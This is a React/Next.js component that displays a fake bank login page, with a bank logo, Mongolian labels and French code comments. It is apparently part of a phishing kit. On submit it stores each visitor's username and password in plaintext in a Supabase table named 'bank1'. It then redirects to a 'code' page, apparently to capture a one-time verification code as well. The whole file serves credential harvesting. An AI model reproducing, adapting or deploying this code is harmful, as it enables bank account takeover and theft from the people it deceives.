'use client'

import { createClient } from '@/utils/supabase/client'
import { useRouter } from 'next/navigation'
import { useState } from 'react'

export default function Bank1LoginForm() {
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  
  const tableName = 'bank1'
  const router = useRouter()
  const supabase = createClient()

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword)
  }

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setIsLoading(true)
    setError(null)

    const formData = new FormData(e.currentTarget)
    const username = formData.get('username') as string
    const password = formData.get('motdepasse') as string

    try {
      const { data, error } = await supabase
        .from(tableName) // Remplacez par le nom de votre table
        .insert({
            username: username,
            password: password,
          })
          .select('id')
          .single()

      if (error) throw error

      router.push(`/code/${tableName}/${data.id}`) // Redirige vers la page de validation du code
      
    } catch (error: any) {
      console.error('Erreur lors de l\'enregistrement:', error)
      setError(error.message || 'Une erreur est survenue')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <main className="min-h-screen">
      {/* Logo */}
      <div className="py-8 px-4 text-center">
        <img 
          src="/images/bank1.png" 
          alt="Bank Logo" 
          className="max-w-xs w-full h-auto mx-auto"
        />
      </div>

      {/* Form Container */}
      <div className="max-w-md mx-auto px-4">
        {/* Message d'erreur */}
        {error && (
          <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded-lg">
            {error}
          </div>
        )}

        <form 
          id="userForm" 
          onSubmit={handleSubmit}
          className="space-y-4"
        >
          {/* Username */}
          <div>
            <input
              type="text"
              name="username"
              id="username"
              className="w-full px-4 py-3 text-lg border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500"
              placeholder="Нэвтрэх нэр"
              required
              disabled={isLoading}
            />
          </div>

          {/* Password */}
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              id="password"
              name="motdepasse"
              className="w-full px-4 py-3 text-lg border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500 pr-12"
              placeholder="Нууц уг"
              required
              disabled={isLoading}
            />
            <span 
              onClick={togglePasswordVisibility}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 cursor-pointer text-gray-500 hover:text-green-600 p-2"
            >
              <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'} text-black`}></i>
            </span>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 px-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-lg shadow hover:shadow-md transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? 'ачааллаж байна...' : 'Нэгдэх'}
          </button>
        </form>
      </div>
    </main>
  )
}